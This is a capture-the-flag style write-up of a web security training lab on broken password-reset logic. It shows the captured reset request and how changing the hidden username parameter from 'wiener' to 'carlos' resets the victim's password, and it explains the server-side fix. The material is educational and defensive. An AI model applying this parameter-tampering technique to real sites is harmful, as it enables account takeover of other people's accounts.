# Password reset broken logic

This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`

---

## 1. Understanding the Password Reset Flow

- Accessed the lab and clicked `My Account`, which showed a login page. Instead of logging in, clicked `Forgot password`, which navigated to `/forgot-password`.
- Entered `wiener`'s email address. The server sent a password reset link to the email client at `/email`:

```
https://0af300d203c17c0180f080d300f70038.web-security-academy.net/forgot-password?temp-forgot-password-token=j3yjw05pirr4m2swrelt0rfd7xuk2bw1
```

- Clicked the link, which loaded a reset form asking for a new password. Filled in a new password and submitted the form. The resulting request was:

```http
POST /forgot-password?temp-forgot-password-token=j3yjw05pirr4m2swrelt0rfd7xuk2bw1 HTTP/2
Host: 0af300d203c17c0180f080d300f70038.web-security-academy.net
Cookie: session=j6WB8n7hMv5gboE0wilLoshr4rZYe6MJ
Content-Length: 129
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0af300d203c17c0180f080d300f70038.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0af300d203c17c0180f080d300f70038.web-security-academy.net/forgot-password?temp-forgot-password-token=j3yjw05pirr4m2swrelt0rfd7xuk2bw1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

temp-forgot-password-token=j3yjw05pirr4m2swrelt0rfd7xuk2bw1&username=wiener&new-password-1=newpassword&new-password-2=newpassword
```

- The critical observation: the request body included a `username` field — `username=wiener` — which was being sent as a hidden input alongside the reset token. The server was using this `username` parameter to decide *whose* password to actually change, rather than deriving it server-side from the token itself.

---

## 2. Exploiting the Broken Logic

- The design flaw here is that the reset token and the username are treated as two independent inputs. A correctly implemented password reset would tie the token to a specific user at the time it was generated (server-side), and the reset endpoint would look up which user the token belongs to — ignoring any client-supplied username entirely. Instead, this application trusts the `username` value sent in the POST body, meaning anyone who holds *any* valid reset token can reset *any* user's password by simply changing the `username` parameter.
- Sent the same reset request but with `username` changed from `wiener` to `carlos`, keeping the original token and everything else intact:

```
temp-forgot-password-token=j3yjw05pirr4m2swrelt0rfd7xuk2bw1&username=carlos&new-password-1=newpassword&new-password-2=newpassword
```

> **Why this works:** The server validates the reset token (`temp-forgot-password-token`) to confirm that a legitimate reset flow was initiated, but it doesn't verify that the token was issued for the username being submitted. It simply reads the `username` field from the POST body and resets that account's password. Since `username` is a hidden form field controlled by the client, swapping it to `carlos` redirects the password change to his account with no additional verification.

---

## 3. Solve the Challenge

- The server accepted the modified request and reset `carlos`'s password to `newpassword`.
- Navigated to `/login` and logged in as `carlos:newpassword`.
- Was redirected to `/my-account?id=carlos`. Lab solved.